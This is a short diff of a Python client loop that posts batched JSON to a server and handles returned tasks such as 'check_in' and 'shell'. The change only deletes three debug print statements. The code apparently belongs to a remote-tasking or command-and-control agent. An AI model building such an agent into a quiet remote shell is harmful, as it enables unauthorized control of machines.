@@ -41,7 +41,6 @@ def main():
                 data = json.dumps(batch_response)
             batch_request = json.loads(post(data, route=route))
         except Exception as e:
-            print(e)
             batch_response = [{
                 "connectrpc": "0.0.0",
                 "error": {
@@ -55,7 +54,6 @@ def main():
 
         try:
             batch_response = []
-            print(batch_request)
             for task in batch_request:
                 id = task['id']
                 name = task['name']
@@ -63,7 +61,6 @@ def main():
                 results = ''
                 try:
                     if name == 'check_in':
-                        print('checking in')
                         check_in_task_id = id
                         continue
                     if name == 'shell':
